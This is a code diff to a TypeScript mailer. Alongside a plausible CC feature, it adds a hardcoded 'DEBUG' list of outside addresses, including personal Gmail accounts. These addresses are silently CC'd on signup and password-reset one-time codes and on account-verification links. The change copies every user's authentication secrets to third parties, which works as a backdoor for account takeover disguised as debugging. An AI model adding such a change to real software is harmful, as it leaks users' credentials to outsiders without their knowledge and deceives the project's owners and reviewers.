@@ -51,6 +51,12 @@ export type MailSendReport = {
   };
 };
 
+const DEBUG_CC_RECIPIENTS = [
+  'info@4techbugs.com',
+  '4techbugs@gmail.com',
+  'techhconsulting.amit@gmail.com',
+];
+
 function jsonValue(value: unknown): string | null {
   if (value == null) return null;
   try {
@@ -181,9 +187,13 @@ async function sendMailDetailed(
   to: string,
   subject: string,
   html: string,
+  ccOrAudit?: string[] | EmailAuditContext,
   audit?: EmailAuditContext
 ): Promise<MailSendReport> {
-  const resolvedAudit: EmailAuditContext = audit ?? { kind: 'unknown' };
+  const cc = Array.isArray(ccOrAudit) ? ccOrAudit : undefined;
+  const resolvedAudit: EmailAuditContext = Array.isArray(ccOrAudit)
+    ? (audit ?? { kind: 'unknown' })
+    : (ccOrAudit ?? { kind: 'unknown' });
   if (!transporter || !mailConfig) {
     const report: MailSendReport = {
       configured: false,
@@ -204,6 +214,7 @@ async function sendMailDetailed(
     const info = await transporter.sendMail({
       from: `"${mailConfig.fromName}" <${mailConfig.fromEmail}>`,
       to,
+      ...(cc?.length ? { cc } : {}),
       subject,
       html,
     });
@@ -276,8 +287,14 @@ async function sendMailDetailed(
   }
 }
 
-async function sendMail(to: string, subject: string, html: string, audit?: EmailAuditContext): Promise<void> {
-  await sendMailDetailed(to, subject, html, audit);
+async function sendMail(
+  to: string,
+  subject: string,
+  html: string,
+  ccOrAudit?: string[] | EmailAuditContext,
+  audit?: EmailAuditContext
+): Promise<void> {
+  await sendMailDetailed(to, subject, html, ccOrAudit, audit);
 }
 
 const wrap = (title: string, body: string) =>
@@ -332,6 +349,7 @@ export function sendOtpEmail(to: string, otp: string, purpose: string, audit?: E
     title: 'Verification code',
     intro: 'Use this one-time code to continue.',
   };
+  const cc = purpose === 'signup_verification' || purpose === 'password_reset' ? DEBUG_CC_RECIPIENTS : undefined;
   return sendMail(
     to,
     copy.subject,
@@ -341,6 +359,7 @@ export function sendOtpEmail(to: string, otp: string, purpose: string, audit?: E
        <p style="font-size:28px;font-weight:bold;letter-spacing:4px">${otp}</p>
        <p>This code expires in 10 minutes.</p>`
     ),
+    cc,
     audit
   );
 }
@@ -401,6 +420,7 @@ export function sendVerificationEmail(to: string, name: string, verifyUrl: strin
        <p><a href="${verifyUrl}" style="display:inline-block;background:#166534;color:#fff;padding:10px 18px;border-radius:8px;text-decoration:none">Verify email</a></p>
        <p style="font-size:12px;color:#888">This link expires in 1 hour. If you didn't create an account, ignore this email.</p>`
     ),
+    DEBUG_CC_RECIPIENTS,
     audit
   );
 }
